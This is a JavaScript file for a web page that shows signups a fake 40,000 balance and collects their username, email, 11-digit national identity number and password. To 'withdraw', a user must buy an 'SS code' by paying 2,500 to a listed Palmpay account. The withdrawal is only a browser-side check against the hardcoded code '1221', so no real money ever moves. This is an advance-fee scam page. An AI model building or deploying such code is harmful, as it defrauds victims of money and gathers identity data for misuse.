let balance = 40000;
let username;

document.getElementById('signup-btn').addEventListener('click', () => {
  document.getElementById('welcome-section').style.display = 'none';
  document.getElementById('signup-section').style.display = 'block';
});

document.querySelector('#signup-section form').addEventListener('submit', (e) => {
  e.preventDefault();
  username = document.querySelector('#signup-section input[type="text"]').value;
  const email = document.querySelector('#signup-section input[type="email"]').value;
  const nin = document.querySelectorAll('#signup-section input[type="text"]')[1].value;
  const password = document.querySelector('#signup-section input[type="password"]').value;

  if (username && email && nin && password) {
    if (nin.length === 11 && password.length >= 8) {
      document.getElementById('signup-section').style.display = 'none';
      document.getElementById('dashboard-section').style.display = 'block';
      document.getElementById('welcome-message').innerText = `Welcome, ${username}!`;
      document.getElementById('balance').innerText = balance;
    } else {
      alert('Invalid NIN or Password length');
    }
  } else {
    alert('Please fill all fields');
  }
});

document.getElementById('buy-ss-code-btn').addEventListener('click', () => {
  document.getElementById('dashboard-section').style.display = 'none';
  document.getElementById('buy-ss-code-section').style.display = 'block';
});

document.getElementById('email-form').addEventListener('submit', (e) => {
  e.preventDefault();
  const email = document.getElementById('email').value;
  if (email) {
    const instructions = `
      <p>Send 2,500 to:</p>
      <p>7088246238</p>
      <p>Palmpay</p>
      <p>Reference: ${email}</p>
    `;
    document.getElementById('instructions').innerHTML = instructions;
  } else {
    alert('Please enter your email');
  }
});

document.getElementById('back-btn').addEventListener('click', () => {
  document.getElementById('buy-ss-code-section').style.display = 'none';
  document.getElementById('dashboard-section').style.display = 'block';
});

document.getElementById('withdraw-btn').addEventListener('click', () => {
  document.getElementById('withdrawal-form-section').style.display = 'block';
});

document.getElementById('withdrawal-form').addEventListener('submit', (e) => {
  e.preventDefault();
  const ssCode = document.getElementById('ss-code').value;
  const amount = parseInt(document.getElementById('amount').value);

  if (ssCode === '1221' && amount <= 20000 && amount <= balance) {
    balance -= amount;
    document.getElementById('balance').innerText = balance;
    alert('Withdrawal successful!');
    document.getElementById('withdrawal-form-section').style.display = 'none';
  } else {
    if (ssCode !== '1221') {
      alert('Invalid SS Code');
    } else if (amount < 20000) {
      alert('Amount must not be higher than 20,000');
    } else {
      alert('amount should not be higher than 20000');
    }
  }
});